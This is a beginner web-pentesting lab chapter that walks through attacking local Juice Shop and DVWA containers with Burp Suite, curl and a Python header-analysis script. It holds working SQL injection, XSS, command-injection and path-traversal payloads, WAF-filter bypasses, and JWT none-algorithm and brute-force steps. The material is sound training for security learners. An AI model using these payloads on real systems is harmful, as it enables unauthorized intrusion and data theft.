# 01 — Fundamentals: Hands-On Labs

> Every lab builds muscle memory. Don't skip any. The goal isn't to "complete" the lab — it's to understand what's happening at each step.

> 📋 **What You Will Do In This Section**
> - [ ] Intercept and fully analyze a login request in Burp Suite
> - [ ] Map all input points of Juice Shop (15+ endpoints)
> - [ ] Modify and replay HTTP requests to test for vulnerabilities
> - [ ] Extract server intelligence from HTTP responses
> - [ ] Decode and attack JWT session tokens
> - [ ] Bypass DVWA defenses at Low, Medium, and High difficulty
> - [ ] Build a Python HTTP security analyzer script

---

## 🔧 Lab Environment Setup

```bash
# Start Juice Shop (or restart if already created)
docker start juiceshop 2>/dev/null || docker run -d -p 3000:3000 --name juiceshop bkimminich/juice-shop

# Start DVWA (or restart if already created)
docker start dvwa 2>/dev/null || docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa

# Verify both are running
echo "Juice Shop: $(curl -s -o /dev/null -w '%{http_code}' http://localhost:3000)"
echo "DVWA:       $(curl -s -o /dev/null -w '%{http_code}' http://localhost)"
```

> ✅ **Expected Output**
> ```
> Juice Shop: 200
> DVWA:       302
> ```
> If DVWA returns `302`, that's normal — it redirects to the login page on first access.

> 🔧 **If Stuck**
> - `Juice Shop: 000` → Container isn't running. Check: `docker ps -a | grep juice`. If it says "Exited", run: `docker start juiceshop`. If it doesn't exist, run the `docker run` command from README Quick Start.
> - `DVWA: 000` → Same process: `docker ps -a | grep dvwa`
> - Port conflict → Change ports: `docker run -d -p 3001:3000 --name juiceshop2 bkimminich/juice-shop`

### Configure Burp Suite (One-Time Setup)

```
1. Open Burp Suite Community Edition
2. Click "Next" on the startup screen → "Start Burp"
3. Go to Proxy → Proxy Settings → Proxy Listeners
4. Confirm listener exists on 127.0.0.1:8080 (it's there by default)
5. Configure YOUR BROWSER to use proxy:
   - Firefox: Settings → Search "proxy" → Manual Proxy → HTTP: 127.0.0.1, Port: 8080
   - Chrome: Use FoxyProxy extension → Add new proxy → 127.0.0.1:8080
6. Visit http://burpsuite in your proxied browser → Download CA certificate
7. Import the CA cert:
   - Firefox: Settings → Search "certificates" → View Certificates → Import → Select downloaded file
   - Chrome: Settings → Privacy → Security → Manage certificates → Import
8. Go to Proxy → Intercept → Turn intercept OFF (we'll turn it on when needed)
```

> ✅ **Expected Output**
> After setup, browse to `http://localhost:3000`. You should see:
> - Juice Shop loads normally in your browser
> - In Burp → Proxy → HTTP history: You see all the requests your browser made, including GET requests, JS files, API calls

> 🔧 **If Stuck**
> - Browser shows "connection refused" → Burp Suite isn't running or proxy settings are wrong. Double-check that the proxy listener is on `127.0.0.1:8080`
> - HTTPS sites show certificate errors → You need to install the Burp CA certificate (step 6-7 above)
> - No requests in HTTP history → Make sure Intercept is OFF (we want to passively record, not block)
> - **Can't install Burp CA cert** → This is the #1 beginner blocker. On Firefox: go to `about:preferences#privacy`, scroll to "Certificates", click "View Certificates", click "Import", select the `cacert.der` file you downloaded

---

## 🧪 Lab 1: Intercept and Analyze a Login Request

### Objective
Intercept the Juice Shop login request, understand every component, and identify attack surfaces.

> 💡 **Why This Matters**
> Request interception is THE fundamental skill of web pentesting. Every exploit you'll ever write starts by understanding what the application sends and receives. If you can't intercept and modify requests, you can't pentest.

### Steps

**Step 1: Capture the login request**
1. Open Burp Suite → Proxy → Intercept → Turn **ON** (the button should say "Intercept is on")
2. In your proxied browser, navigate to `http://localhost:3000/#/login`
3. Enter credentials: `test@test.com` / `password123`
4. Click "Log in"
5. Switch to Burp — you should see the intercepted request

> ✅ **Expected Output (in Burp Intercept tab)**
> ```http
> POST /rest/user/login HTTP/1.1
> Host: localhost:3000
> Content-Type: application/json
> Cookie: language=en; cookieconsent_status=dismiss
> Content-Length: 50
>
> {"email":"test@test.com","password":"password123"}
> ```

> 🔧 **If Stuck**
> - Burp shows nothing → Intercept might be off. Click the button so it says "Intercept is **on**"
> - You see different requests (JS, images, not the login) → Click "Forward" to pass through each request until you see the POST to `/rest/user/login`. Or: Turn intercept OFF, submit the login, then check HTTP History for the POST request.
> - Request shows `GET` instead of `POST` → You're seeing the page load, not the form submission. Make sure you actually clicked "Log in"

**Step 2: Dissect the request**

Document the following (fill this in as you go):

| Component | Value | Attack Potential |
|-----------|-------|------------------|
| Endpoint | `/rest/user/login` | API endpoint — check for other REST endpoints |
| Method | POST | Try other methods (GET, PUT) |
| Content-Type | application/json | Try XML (XXE), form-urlencoded |
| Cookies | language, cookieconsent | Cookie manipulation, injection |
| Password field | Sent in body | Check if sent in plaintext, hashing? |
| Response | Check for JWT/session | Token analysis |

**Step 3: Analyze the response**
1. Click "Forward" in Burp to send the request to the server
2. Turn intercept **OFF**
3. Go to Proxy → HTTP History → Find the POST request to `/rest/user/login`
4. Click on it → Look at the Response tab

> ✅ **Expected Output (Response for wrong credentials)**
> ```http
> HTTP/1.1 401 Unauthorized
> X-Powered-By: Express
> Content-Type: application/json; charset=utf-8
>
> {"error":"Invalid email or password."}
> ```
> **Key observations:**
> - `401` status = authentication failed (expected)
> - `X-Powered-By: Express` = Node.js backend (technology leak!)
> - Error says "Invalid email **or** password" — this is GOOD practice (doesn't reveal which one is wrong). Many apps leak this.

**Step 4: Test with a known-valid email but wrong password**

Send this in Burp Repeater (right-click the request → Send to Repeater):
```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"admin@juice-sh.op","password":"wrongpassword"}
```

Then test with a completely fake email:
```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"doesnotexist@fake.com","password":"wrongpassword"}
```

> ✅ **Expected Output**
> Compare the two responses:
> - Both should return `401` with `"Invalid email or password."`
> - Check response **length** in Burp — if the lengths differ, the app is leaking valid emails!

### ✅ Success Criteria
- [ ] You can explain every line of the request
- [ ] You identified the authentication token format
- [ ] You checked for verbose error messages
- [ ] You documented security headers (present or missing)

---

## 🧪 Lab 2: Map ALL Input Points in a Web Application

### Objective
Systematically identify every input point in Juice Shop. Real pentests start here.

> 💡 **Why This Matters**
> You can't hack what you don't know exists. Mapping the full attack surface BEFORE hacking ensures you don't miss the one vulnerable endpoint everyone else overlooked. This is what separates script kiddies from pentesters.

### Steps

**Step 1: Browse everything with Burp recording**
1. Turn Burp Intercept **OFF** (we want passive recording)
2. Spend 10 minutes clicking through EVERY page and feature of Juice Shop:
   - Login/Register
   - Search products
   - View product pages
   - Add to basket
   - Leave a review
   - Submit feedback (Contact page)
   - Change profile/password
   - Check the "About Us" page
   - Try the "Complain" page
3. In Burp → Target → Site Map → Expand `http://localhost:3000`
4. You'll see every endpoint your browser communicated with

> ✅ **Expected Output**
> In Burp's Site Map, you should see a tree structure like:
> ```
> http://localhost:3000
> ├── /rest/
> │   ├── /rest/user/login          (POST)
> │   ├── /rest/user/whoami         (GET)
> │   ├── /rest/products/search     (GET)
> │   ├── /rest/basket/             (GET/POST)
> │   └── /rest/captcha/            (GET)
> ├── /api/
> │   ├── /api/Users/               (GET/POST)
> │   ├── /api/Feedbacks/           (GET/POST)
> │   ├── /api/Products/            (GET)
> │   └── /api/Challenges/          (GET)
> └── /assets/, /socket.io/, etc.
> ```

**Step 2: Document all input points**

Create this matrix (use the Burp HTTP History to fill it in):

```markdown
| # | URL                        | Method | Parameters            | Input Type    | Notes                    |
|---|----------------------------|--------|-----------------------|---------------|--------------------------|
| 1 | /rest/user/login           | POST   | email, password       | JSON body     | Auth endpoint            |
| 2 | /rest/products/search      | GET    | q (query parameter)   | URL param     | Search function — SQLi?  |
| 3 | /api/Users                 | POST   | email, password, etc  | JSON body     | Registration             |
| 4 | /rest/user/change-password | GET    | current, new, repeat  | URL params    | Password change (GET?!)  |
| 5 | /profile                   | POST   | username              | Form data     | Profile update — XSS?    |
| 6 | /rest/products/{id}/reviews| PUT    | message               | JSON body     | Product review — stored? |
| 7 | /api/Feedbacks             | POST   | comment, rating       | JSON body     | Feedback submission      |
| 8 | /rest/basket/{id}          | GET    | id (path param)       | URL path      | IDOR?                    |
```

**Step 3: Test hidden parameters**

Use Burp's Param Miner extension or manually test for hidden parameters:
```bash
# Common hidden parameters to test
curl -s "http://localhost:3000/rest/user/login?debug=true" | head -5
curl -s "http://localhost:3000/rest/user/login?admin=true" | head -5
curl -s "http://localhost:3000/rest/user/login?test=true" | head -5
```

> ✅ **Expected Output**
> Most of these will return the same response (no change), but occasionally an app will respond differently to `debug=true` or `admin=true`. Document any differences.

**Step 4: Check for API documentation**
```bash
# Common API doc endpoints — run each and check the status code
for path in /api /api-docs /swagger.json /swagger-ui.html /.well-known/openapi.json /api/v1 /docs; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000$path")
  echo "$CODE → http://localhost:3000$path"
done
```

> ✅ **Expected Output**
> ```
> 500 → http://localhost:3000/api
> 404 → http://localhost:3000/api-docs
> 404 → http://localhost:3000/swagger.json
> ...
> ```
> Watch for any `200` or `301` responses — those reveal API documentation endpoints!

### ✅ Success Criteria
- [ ] You found at least 15 unique input points
- [ ] You documented which accept URL params vs body params vs headers
- [ ] You checked for API documentation endpoints
- [ ] You identified at least 3 interesting attack surfaces

---

## 🧪 Lab 3: Modify and Replay Requests

### Objective
Modify intercepted requests to test how the application handles unexpected input.

> 💡 **Why This Matters**
> Browsers only send "normal" requests. As a pentester, you need to send crafted, malicious, and unexpected input. Burp Repeater is your workbench — you'll use it on every engagement to manually test each parameter.

### Steps

**Step 1: Capture and send a search request to Repeater**
1. In your browser (through Burp proxy), search for "apple" in Juice Shop
2. In Burp → HTTP History → Find `GET /rest/products/search?q=apple`
3. Right-click → "Send to Repeater"
4. Switch to the Repeater tab

**Step 2: Test each payload in Repeater**

Modify the `q` parameter with each payload below. For EACH one, click "Send" and document the result:

| Payload | What You're Testing | Expected Behavior |
|---------|--------------------|--------------------|
| `q=apple'` | SQL injection (syntax break) | `500` error with SQL error message |
| `q=apple" OR 1=1--` | SQL injection (boolean) | Different response than normal |
| `q=<script>alert(1)</script>` | Reflected XSS | Check if `<script>` appears in response body |
| `q=apple%00` | Null byte injection | May truncate the query |
| `q=../../../etc/passwd` | Path traversal | Probably returns empty results |
| `q=apple{{7*7}}` | SSTI | Look for `49` in response (if template injection exists) |
| `q=` | Empty input | May return all products (data leak) |
| `q=AAAA...(5000 chars)` | Buffer overflow / length | Watch for `500` error or truncation |

> ✅ **Expected Output (for `q=apple'`)**
> ```json
> {
>   "error": {
>     "message": "SQLITE_ERROR: near \"'\": syntax error",
>     "stack": "SequelizeDatabaseError: SQLITE_ERROR..."
>   }
> }
> ```
> **This is critical!** The error reveals:
> 1. The database is **SQLite**
> 2. Input goes directly into a SQL query (no parameterized query)
> 3. SQL injection IS confirmed

> ✅ **Expected Output (for `q=`)**
> ```json
> { "status": "success", "data": [ /* ALL products returned */ ] }
> ```
> Empty search returns everything — useful for data enumeration.

> 🔧 **If Stuck**
> - Repeater shows nothing after clicking Send → Check the target host/port in Repeater (top bar). It should be `localhost:3000`
> - Getting `Connection refused` → Juice Shop is down. Restart: `docker start juiceshop`
> - Getting `200` for everything → Some payloads won't cause errors. Focus on the ones that return `500` or different response lengths

**Step 3: Replay with modified headers**

In Repeater, modify the request headers:
```http
GET /rest/products/search?q=apple HTTP/1.1
Host: localhost:3000
User-Agent: ' OR 1=1-- -
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: evil.com
```

> ✅ **Expected Output**
> The response will likely be `200` (headers usually aren't reflected in search). But in a real app, if headers are logged to a database, SQLi through `User-Agent` could execute.

**Step 4: Method tampering**

Test different HTTP methods on the same endpoint:
```http
POST /rest/products/search HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"q": "apple"}
```

> ✅ **Expected Output**
> Either `404`, `405 Method Not Allowed`, or a `200` with different behavior. If POST works the same as GET, the app might process body parameters — opening new injection surfaces.

### ✅ Success Criteria
- [ ] You sent at least 5 different payloads through the search parameter
- [ ] You identified different response behaviors for different inputs
- [ ] You tested at least 3 header modifications
- [ ] You tried at least 2 different HTTP methods

---

## 🧪 Lab 4: Response Analysis & Information Gathering

### Objective
Extract maximum intelligence from HTTP responses.

> 💡 **Why This Matters**
> Before you attack, you need to know what you're attacking. Technology fingerprinting narrows your exploit search from "everything" to "Express/Node.js vulnerabilities". This saves hours.

### Steps

**Step 1: Collect server information**
```bash
# Use curl for clean response headers
curl -sI http://localhost:3000
```

> ✅ **Expected Output**
> ```
> HTTP/1.1 200 OK
> X-Powered-By: Express
> Access-Control-Allow-Origin: *
> X-Content-Type-Options: nosniff
> X-Frame-Options: SAMEORIGIN
> Feature-Policy: payment 'self'
> Content-Type: text/html; charset=utf-8
> ```
> **Analysis:**
> - ❌ `X-Powered-By: Express` — INFORMATION LEAK (should be removed in production)
> - ❌ `Access-Control-Allow-Origin: *` — CORS wide open (any site can steal data)
> - ✅ `X-Content-Type-Options: nosniff` — Prevents MIME sniffing (good)
> - ✅ `X-Frame-Options: SAMEORIGIN` — Prevents clickjacking (good)
> - ❌ Missing `Content-Security-Policy` → CSP not set → XSS easier
> - ❌ Missing `Strict-Transport-Security` → HSTS not set

**Step 2: Force error messages**
```bash
# Send malformed requests to get verbose errors
echo "--- SQLi in search ---"
curl -s http://localhost:3000/rest/products/search?q=\' | python3 -m json.tool 2>/dev/null | head -10

echo "--- Invalid user ID ---"
curl -s http://localhost:3000/api/Users/undefined | python3 -m json.tool 2>/dev/null | head -10

echo "--- Empty login ---"
curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{}' | python3 -m json.tool 2>/dev/null | head -10

echo "--- Null email ---"
curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":null}' | python3 -m json.tool 2>/dev/null | head -10
```

> ✅ **Expected Output**
> Each request should produce a different error. Look for:
> - Database type (SQLite, MySQL, PostgreSQL)
> - Stack traces (file paths, function names)
> - Framework details (Sequelize, Express)
> - Internal error codes

**Step 3: Compare response sizes for username enumeration**
```bash
# Valid email, wrong password
SIZE1=$(curl -s http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"wrong"}' | wc -c)

# Invalid email, wrong password
SIZE2=$(curl -s http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"nonexistent@test.com","password":"wrong"}' | wc -c)

echo "Valid email response:   $SIZE1 bytes"
echo "Invalid email response: $SIZE2 bytes"

if [ "$SIZE1" != "$SIZE2" ]; then
  echo "⚠️  DIFFERENT SIZES — Username enumeration possible!"
else
  echo "✅ Same sizes — no obvious enumeration"
fi
```

> ✅ **Expected Output**
> ```
> Valid email response:   63 bytes
> Invalid email response: 63 bytes
> ✅ Same sizes — no obvious enumeration
> ```
> If sizes differ, the application distinguishes between "user exists" and "user doesn't exist" — useful for building a valid username list.

### ✅ Success Criteria
- [ ] You identified the web framework in use
- [ ] You found at least 2 missing security headers
- [ ] You extracted an error message that reveals internal information
- [ ] You tested for username enumeration via response differences

---

## 🧪 Lab 5: Cookie and Session Analysis

### Objective
Analyze session management implementation and identify weaknesses.

> 💡 **Why This Matters**
> Sessions = identity. If you can steal, forge, or manipulate a session token, you can impersonate any user. JWT flaws are among the highest-paid bug bounty findings because they lead directly to account takeover.

### Steps

**Step 1: Register and login to Juice Shop**

```bash
# Register a new account
curl -s -X POST http://localhost:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@test.com","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2024-01-01","updatedAt":"2024-01-01"},"securityAnswer":"test"}' | python3 -m json.tool | head -10
```

> ✅ **Expected Output**
> ```json
> {
>     "status": "success",
>     "data": {
>         "id": 22,
>         "email": "hacker@test.com",
>         ...
>     }
> }
> ```

> 🔧 **If Stuck**
> - `"Email must be unique"` → This email is already registered. Use a different one like `hacker2@test.com`
> - `"password too weak"` → Must include uppercase, lowercase, number, and special char: `Test1234!`

```bash
# Login and grab the JWT
TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

echo "Your JWT: $TOKEN"
```

> ✅ **Expected Output**
> ```
> Your JWT: eyJhbGciOi... (a long Base64 string with two dots)
> ```

**Step 2: Decode the JWT**
```bash
# Decode the header (first segment)
echo "=== JWT Header ==="
echo "$TOKEN" | cut -d'.' -f1 | base64 -d 2>/dev/null; echo

# Decode the payload (second segment)
echo "=== JWT Payload ==="
echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null; echo
```

> ✅ **Expected Output**
> ```
> === JWT Header ===
> {"alg":"RS256","typ":"JWT"}
> === JWT Payload ===
> {"status":"success","data":{"id":22,"email":"hacker@test.com","password":"...hash...","role":"customer","isActive":true},"iat":1234567890,"exp":1234571490}
> ```
> **Critical observations:**
> - `alg: RS256` → Asymmetric signing. The `none` algorithm attack might work.
> - `role: customer` → If you could change this to `admin`, you'd have admin access.
> - `password` hash is IN the token! → JWT payload contains sensitive data (bad practice).

**Step 3: Identify JWT weaknesses**
```bash
# 1. Algorithm None attack (if jwt_tool is installed)
python3 jwt_tool.py "$TOKEN" -X a 2>/dev/null

# 2. Key brute force (tries common secrets)
python3 jwt_tool.py "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt 2>/dev/null

# 3. Manual check — what happens if you modify the payload?
# Change "customer" to "admin" and see if the server accepts it
```

> ✅ **Expected Output**
> ```
> jwt_tool will show you:
> - Whether the None algorithm attack generates a valid token
> - Whether any common secret key is used for signing
> ```

> 🔧 **If Stuck**
> - `jwt_tool not found` → Install: `git clone https://github.com/ticarpi/jwt_tool.git && pip3 install -r jwt_tool/requirements.txt`
> - `rockyou.txt not found` → On Kali: already at `/usr/share/wordlists/`. On other systems: download from https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
> - Can't decode → JWT might have URL-safe Base64. Try: `echo "$TOKEN" | cut -d'.' -f2 | tr '_-' '/+' | base64 -d`

**Step 4: Test session handling**

```bash
# Test 1: Does the token work after "logout"?
# Login → get token → use token → "logout" → use same token again

# Use the token to access a protected endpoint
curl -s http://localhost:3000/rest/user/whoami \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# Now, "log out" (clear session on server — if the app even does this)
# Try the same token again
curl -s http://localhost:3000/rest/user/whoami \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

> ✅ **Expected Output**
> If both requests return user data, the token is NOT being invalidated on logout. This means stolen tokens remain valid until they expire — a session management weakness.

### ✅ Success Criteria
- [ ] You decoded the JWT and identified all claims
- [ ] You identified the signing algorithm
- [ ] You tested at least 2 JWT attack vectors
- [ ] You tested session invalidation on logout

---

## 🧪 Lab 6: DVWA — Hands-On With Difficulty Levels

### Objective
Use DVWA's adjustable difficulty to understand how defenses work (and how to bypass them).

> 💡 **Why This Matters**
> Real-world applications have varying levels of defense. DVWA simulates this perfectly — Low has no protection, Medium has basic filtering, High has proper defenses. Learning to bypass each level teaches you how real WAFs and input filters work.

### Steps

**Step 1: Setup DVWA**
1. Navigate to `http://localhost/setup.php`
2. Click "Create / Reset Database"
3. Login: `admin` / `password`
4. Go to "DVWA Security" → Set to "Low"

> ✅ **Expected Output**
> After login, you should see the DVWA dashboard with vulnerability categories listed on the left: Brute Force, Command Injection, CSRF, File Inclusion, File Upload, SQL Injection, XSS (Reflected), XSS (Stored).

> 🔧 **If Stuck**
> - Login fails → Default credentials are `admin` / `password`. If you've changed them, reset the database via `http://localhost/setup.php`
> - "Table doesn't exist" error → Click "Create / Reset Database" on the setup page
> - Can't access `http://localhost` → DVWA might be on a different port. Check: `docker ps` and look at the port mapping

**Step 2: Walk through each vulnerability at LOW difficulty**

For each module (Brute Force, Command Injection, CSRF, File Inclusion, File Upload, SQL Injection, XSS), do:

1. Submit a normal input → document the request in Burp
2. Submit a malicious input → document the behavior
3. Click **"View Source"** (bottom right) → understand **WHY** it worked

**Example: Command Injection (Low)**
```
1. Enter: 127.0.0.1
   → Expected: Normal ping output

2. Enter: 127.0.0.1; id
   → Expected: Ping output PLUS "uid=33(www-data) gid=33(www-data) groups=33(www-data)"

3. View Source → You'll see: shell_exec('ping -c 4 ' . $_REQUEST['ip']);
   → No input validation! Your "; id" was appended directly to the system command.
```

> ✅ **Expected Output (Command Injection)**
> ```
> PING 127.0.0.1 (127.0.0.1): 56 data bytes
> 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.028 ms
> ...
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
> ```

**Example: SQL Injection (Low)**
```
1. Enter: 1
   → Expected: User "admin" with first name and surname

2. Enter: ' OR 1=1#
   → Expected: ALL users in the database are displayed

3. View Source → You'll see: "SELECT ... WHERE user_id = '$id'"
   → The single quote closes the string, and OR 1=1 makes the WHERE clause always true
```

> ✅ **Expected Output (SQL Injection)**
> ```
> ID: ' OR 1=1#
> First name: admin
> Surname: admin
>
> ID: ' OR 1=1#
> First name: Gordon
> Surname: Brown
>
> ID: ' OR 1=1#
> First name: Hack
> Surname: Me
> ... (more users)
> ```

**Step 3: Increase to MEDIUM and re-exploit**

| Module | Low Bypass | Medium Defense | Medium Bypass |
|--------|------------|----------------|---------------|
| SQLi | `' OR 1=1#` | `mysql_real_escape_string()` | Try numeric injection: `1 OR 1=1` (no quotes needed) |
| XSS Reflected | `<script>alert(1)</script>` | `<script>` tag replaced with empty | `<img onerror=alert(1) src=x>` |
| Command Injection | `; id` | `;` and `&&` blacklisted | `| id` or `|| id` (pipe isn't blacklisted) |
| File Inclusion | `../../etc/passwd` | Path checks added | `....//....//etc/passwd` (double traversal) |

> ✅ **Expected Output (Medium XSS Bypass)**
> When `<script>` is filtered, using `<img onerror=alert(1) src=x>` should trigger a JavaScript alert popup. The browser attempts to load an image from `x`, fails, and executes the `onerror` handler.

**Step 4: Try HIGH difficulty**

At HIGH, defenses are stronger. Document what defense was added and research bypass techniques. This is where you build real skill.

> 🔧 **If Stuck on HIGH Difficulty**
> - SQLi HIGH: Check if the application uses a dropdown instead of text input. Use Burp to modify the request directly — the dropdown is a client-side control.
> - XSS HIGH: Try event handlers on less common tags: `<details open ontoggle=alert(1)>`, `<svg onload=alert(1)>`
> - Command Injection HIGH: The filter is strong but may have a gap. Try `|id` (no space before `id`)

### ✅ Success Criteria
- [ ] You completed all modules at LOW difficulty
- [ ] You bypassed at least 3 modules at MEDIUM difficulty
- [ ] You read the source code for each difficulty level and understood the defense
- [ ] You attempted at least 2 modules at HIGH difficulty

---

## 🧪 Lab 7: Build Your Own HTTP Analysis Script

### Objective
Write a Python script that analyzes HTTP responses for security weaknesses. This builds your automation mindset.

> 💡 **Why This Matters**
> Manual checks don't scale. On a real engagement with 50+ subdomains, you need automated header/security checks. This script becomes a tool in YOUR personal toolkit — one you can extend throughout this handbook.

### The Script

```python
#!/usr/bin/env python3
"""
HTTP Security Analyzer
Checks for common security misconfigurations in HTTP responses.

Usage: python3 http_analyzer.py <URL>
"""

import requests
import sys
import json
from urllib.parse import urlparse

def analyze_headers(url):
    """Analyze security headers in HTTP response."""
    try:
        resp = requests.get(url, verify=False, timeout=10, allow_redirects=True)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return

    print(f"\n{'='*60}")
    print(f"TARGET: {url}")
    print(f"STATUS: {resp.status_code}")
    print(f"SERVER: {resp.headers.get('Server', 'Not disclosed')}")
    print(f"{'='*60}")

    # Security headers check
    security_headers = {
        'Strict-Transport-Security': 'HSTS missing — no forced HTTPS',
        'Content-Security-Policy': 'CSP missing — XSS easier to exploit',
        'X-Content-Type-Options': 'Missing — MIME sniffing possible',
        'X-Frame-Options': 'Missing — Clickjacking possible',
        'X-XSS-Protection': 'Missing — Browser XSS filter not enforced',
        'Referrer-Policy': 'Missing — Referer header leaks URLs',
        'Permissions-Policy': 'Missing — Browser features not restricted',
    }

    print("\n[*] Security Headers Analysis:")
    for header, warning in security_headers.items():
        value = resp.headers.get(header)
        if value:
            print(f"  ✅ {header}: {value}")
        else:
            print(f"  ❌ {header}: {warning}")

    # Information leakage
    print("\n[*] Information Leakage:")
    leak_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version']
    for header in leak_headers:
        value = resp.headers.get(header)
        if value:
            print(f"  ⚠️  {header}: {value} — Technology disclosed!")

    # Cookie analysis
    print("\n[*] Cookie Analysis:")
    if not resp.cookies:
        print("  ℹ️  No cookies set in response")
    for cookie in resp.cookies:
        flags = []
        if cookie.secure:
            flags.append("✅ Secure")
        else:
            flags.append("❌ NOT Secure")
        if 'httponly' in cookie._rest.keys() or cookie.has_nonstandard_attr('HttpOnly'):
            flags.append("✅ HttpOnly")
        else:
            flags.append("❌ NOT HttpOnly")
        print(f"  Cookie: {cookie.name} = {cookie.value[:20]}... | {' | '.join(flags)}")

    # CORS check
    print("\n[*] CORS Configuration:")
    resp_cors = requests.get(url, headers={'Origin': 'https://evil.com'}, verify=False, timeout=10)
    acao = resp_cors.headers.get('Access-Control-Allow-Origin')
    if acao:
        if acao == '*':
            print(f"  ❌ CORS wildcard (*) — Any origin can read responses!")
        elif 'evil.com' in acao:
            print(f"  ❌ CORS reflects arbitrary origin — Exploitable!")
        else:
            print(f"  ⚠️  CORS: {acao}")
    else:
        print(f"  ✅ No CORS headers for evil.com origin")

    return resp

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        sys.exit(1)
    analyze_headers(sys.argv[1])
```

### Exercise

```bash
# 1. Save the script
# (Save the code above as http_analyzer.py)

# 2. Run against Juice Shop
python3 http_analyzer.py http://localhost:3000

# 3. Run against DVWA
python3 http_analyzer.py http://localhost
```

> ✅ **Expected Output (Juice Shop)**
> ```
> ============================================================
> TARGET: http://localhost:3000
> STATUS: 200
> SERVER: Not disclosed
> ============================================================
>
> [*] Security Headers Analysis:
>   ❌ Strict-Transport-Security: HSTS missing — no forced HTTPS
>   ❌ Content-Security-Policy: CSP missing — XSS easier to exploit
>   ✅ X-Content-Type-Options: nosniff
>   ✅ X-Frame-Options: SAMEORIGIN
>   ❌ X-XSS-Protection: Missing — Browser XSS filter not enforced
>   ❌ Referrer-Policy: Missing — Referer header leaks URLs
>   ❌ Permissions-Policy: Missing — Browser features not restricted
>
> [*] Information Leakage:
>   ⚠️  X-Powered-By: Express — Technology disclosed!
>
> [*] CORS Configuration:
>   ❌ CORS wildcard (*) — Any origin can read responses!
> ```

> 🔧 **If Stuck**
> - `ModuleNotFoundError: No module named 'requests'` → Install: `pip3 install requests`
> - `ConnectionRefusedError` → Target isn't running. Start it with Docker.
> - Script shows `[!] Request failed` → Check the URL format includes `http://`

### Bonus Exercises (extend the script)
1. Add a check for common sensitive paths (`/robots.txt`, `/.git/HEAD`, `/.env`, `/wp-config.php`)
2. Add a check for common API documentation endpoints (`/swagger.json`, `/api-docs`)
3. Output results to a JSON file: `python3 http_analyzer.py http://localhost:3000 > results.json`

### ✅ Success Criteria
- [ ] Script runs and produces output against Juice Shop
- [ ] You added at least 2 additional checks
- [ ] You ran it against both Juice Shop and DVWA
- [ ] You understand WHY each check matters

---

## 📋 Lab Completion Checklist

- [ ] Lab 1: Login request intercepted and fully analyzed
- [ ] Lab 2: 15+ input points documented
- [ ] Lab 3: Multiple payloads tested with documented responses
- [ ] Lab 4: Server info extracted, security headers analyzed
- [ ] Lab 5: JWT decoded and attack vectors tested
- [ ] Lab 6: DVWA Low completed, Medium attempted
- [ ] Lab 7: HTTP analyzer script built and extended

---

## 🧠 If You're Stuck

1. **Can't intercept traffic in Burp**: Check proxy settings. Browser must use `127.0.0.1:8080`. Install Burp CA cert (see Lab Setup above). Try Firefox — it has the easiest proxy configuration.
2. **Juice Shop won't start**: Run `docker logs juiceshop` — usually a port conflict. Try `-p 3001:3000`. If the container doesn't exist: `docker run -d -p 3000:3000 --name juiceshop bkimminich/juice-shop`
3. **DVWA database error**: Visit `http://localhost/setup.php` and click "Create / Reset Database" again. Login: `admin` / `password`.
4. **Don't understand the response**: Google the exact error message. StackOverflow and PortSwigger Academy are your friends.
5. **JWT decode gives garbage**: The Base64 might need padding. Try adding `==` to the end before decoding.
6. **Feel overwhelmed**: Do one lab per day. Quality over speed. Each lab builds on the previous one.
7. **Python script errors**: Make sure `requests` is installed: `pip3 install requests`. Check Python version: `python3 --version` (need 3.6+).
